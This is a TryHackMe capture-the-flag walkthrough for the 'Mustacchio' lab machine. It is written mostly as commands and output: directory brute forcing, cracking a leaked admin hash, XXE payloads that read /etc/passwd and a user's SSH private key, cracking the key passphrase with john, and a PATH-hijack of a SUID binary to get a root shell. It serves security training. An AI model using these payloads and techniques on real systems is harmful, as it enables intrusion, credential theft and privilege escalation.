---
title: Mustacchio
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Mustacchio
  machine on TryHackMe.
slug: mustacchio
---




```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  ultraseek-http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
gobuster dir -u 10.66.139.40 -w /usr/share/wordlists/dirb/common.txt -x txt,ssh, php,html

/custom               (Status: 301) [Size: 313] [--> http://10.66.139.40/custom/]

```

```


|![[ICO]](http://10.66.139.40/icons/blank.gif)|[Name](http://10.66.139.40/custom/js/?C=N;O=D)|[Last modified](http://10.66.139.40/custom/js/?C=M;O=A)|[Size](http://10.66.139.40/custom/js/?C=S;O=A)|[Description](http://10.66.139.40/custom/js/?C=D;O=A)|

|![[PARENTDIR]](http://10.66.139.40/icons/back.gif)|[Parent Directory](http://10.66.139.40/custom/)||-||
|![[   ]](http://10.66.139.40/icons/unknown.gif)|[mobile.js](http://10.66.139.40/custom/js/mobile.js)|2021-06-12 15:48|1.4K||
|![[   ]](http://10.66.139.40/icons/unknown.gif)|[users.bak](http://10.66.139.40/custom/js/users.bak)|2021-06-12 15:48|8.0K||
|---|   |   |   |   |

Apache/2.4.18 (Ubuntu) Server at 10.66.139.40 Port 80
```

> So in user.bak

```
users.bak
┌──(kali㉿kali)-[~/tryhackme/mustacchio]
└─$ file users.bak            
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
     
┌──(kali㉿kali)-[~/tryhackme/mustacchio]
└─$ mv users.bak users.sql     
     
┌──(kali㉿kali)-[~/tryhackme/mustacchio]
└─$ cat users.sql                                                                              
admin 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b                                                                  

```

> crack the hash `bulldog19`

> login port  8765

```
 <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

    <!-- Barry, you can now SSH in using your key!-->

   
```

```
<?xml version="1.0" encoding="UTF-8"?>                                            
<comment>                                                                         
  <name>Joe Hamd</name>                                                           
  <author>Barry Clad</author>                                                     
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading
 this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you d
o not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not usi
ng your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and 
terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, y
ou have wasted an estimated time of 20 seconds.</com>
</comment>
```

```
xml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>

Encode payload: URL


xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%0D%0A%3C%21DOCTYPE+updateProfile+%5B%0D%0A%3C%21ENTITY+file+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E+%5D%3E%0D%0A%3Ccomment%3E%0D%0A%3Cname%3EJoe%3C%2Fname%3E%0D%0A%3Cauthor%3EMrEmpy%3C%2Fauthor%3E%0D%0A%3Ccom%3E%26file%3B%3C%2Fcom%3E%0D%0A%3C%2Fcomment%3E
```


```
POST /home.php HTTP/1.1
Host: 10.66.166.251:8765
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.66.166.251:8765/home.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 323
Origin: http://10.66.166.251:8765
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: PHPSESSID=hltajrqneachcu6kh9spddi7d4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%0D%0A%3C%21DOCTYPE+updateProfile+%5B%0D%0A%3C%21ENTITY+file+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E+%5D%3E%0D%0A%3Ccomment%3E%0D%0A%3Cname%3EJoe%3C%2Fname%3E%0D%0A%3Cauthor%3EMrEmpy%3C%2Fauthor%3E%0D%0A%3Ccom%3E%26file%3B%3C%2Fcom%3E%0D%0A%3C%2Fcomment%3E
```


```
     <h3>Comment Preview:</h3><p>Name: Joe</p><p>Author : MrEmpy</p><p>Comment :<br> root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash<p/>    </section>

```

> Now know users

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>

  <com>&xxe;</com>
</comment>

Encode payload: URL

=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fhome%2Fbarry%2F.ssh%2Fid_rsa%22%3E%5D%3E%0D%0A%3Ccomment%3E%0D%0A++%3Cname%3EJoe+Hamd%3C%2Fname%3E%0D%0A++%3Cauthor%3EBarry+Clad%3C%2Fauthor%3E%0D%0A%0D%0A++%3Ccom%3E%26xxe%3B%3C%2Fcom%3E%0D%0A%3C%2Fcomment%3E

```

> Now you can get private key

```
└─$ nano id_rsa
     
┌──(kali㉿kali)-[~/tryhackme/mustacchio]
└─$ /usr/share/john/ssh2john.py id_rsa > hash
     
┌──(kali㉿kali)-[~/tryhackme/mustacchio]
└─$ cat hash
id_rsa:$sshng$1$16$D137279D69A43E71BB7FCB87FC61D25E$1200$8ea0c93fe6e552bfb1325012601f6de20172325f55ba01d0240ca519913a27f6f59c6e7b78660e33cc1d66f54c1ab7cd6cd2556578fa565b9932bf6e117f18e2f0b66edd8a081885836db807ad73e17268896437e46fdb5ecd591b15e8348314319749ec31f5936dbaa9032d9b8abde8c64a110e5915ad37d92a21b5f0cfb288a6ffb74d6a910eba3466c3eaee044eb99767fdc1909f0da119bf1092c901432630579b4ee6a9f489ddde7d77086b1bd76eaeebb5fda95452f23f8ccf1b392d8359fc9fde79185d6c83e123c249329ccb853d616dba2c6eca3052dc59c1b40f797a9750f0c9e50166673c500b90147ec436c36cc15ca492bde0b3097604c4ea1b3d5bc3fd6039d0a3dc1c9cd4b27a9915977c3dc74a659c73ff1b1df76f552810ba5ec0f113a5cefae2eff58795c200d527dcac56948fcbdf5e2e777e2a7d8016cb7fab323a8d330c9e15bf0df270e89e4c7e9bea61857b146249a13fbb7af9e2f6732f4287817b5aa736f880397fc90268df0a83d457d8ec00b5d9e51cf4d742adcbc6f1770383ea014289039c65529c69a6be63f122c5534f7d36ef2933c1e8b759595a80c04238efde92861e3569576e1975a93b50eae0b59078f24c750a359541efc78349a9e4a0444bc9f71d6b8f64fdec476584e698a29c763350f8a364e1ca6f946f50a79161eee1420d6a2113fa842e944a678fe4e87880e054b5dc3e7d265bcb08a43a23039f2119ecb5807cefe6283243d61ef2a3992fef317f9e95c65cbe1e3b28d74d978910c7ae414939ab5122bc1a01a7a8826edbf1b57c193e4fe81671e4b9d56af1209ba29a68f0b850f74b65d96955c949d2bb8af0f713c29f5a380cc74cd716ee0c72709f0169226a162679a77a5a2587b4cf7c1bf850e8aeb23c33bb18387b059b8c829343fcb6d2fafa413d1cd7a2d0a55c7e90f7d23b2c8b9008de6109bf191c50f4e80f85d9a64da60d06ec5b324f04e7002b592d9eb519dc61362fb7b633950c64243d552ca6487d82abf9fa6759e8b544a90df5796db376d0947d4bb8592cebf809dd1cf6b696ab7dd0ffb01f68927786cc4acc6095a5cf5dd7152719b04ecf8a979e9f46898a0fd61d3ed0f852fcabe770a1ec28a224db............................
   
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
uriel......     (id_rsa)     

```

```
ssh -i id_rsa barry@10.66.166.251
Enter passphrase for key 'id_rsa': 
```

```
find / -type f -perm -u=s 2>/dev/null

....
.......
/home/joe/live_log
......
......
```

```
barry@mustacchio:~$ export PATH=$PWD:$PATH
barry@mustacchio:~$ echo $PATH
/home/barry:/home/joe:/home:/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:~$ cat > tail << 'EOF'
> #!/usr/bin/python3
> import pty
> pty.spawn("/bin/bash")
> EOF
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ /home/joe/live_log

root@mustacchio:~# cd /root
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt

```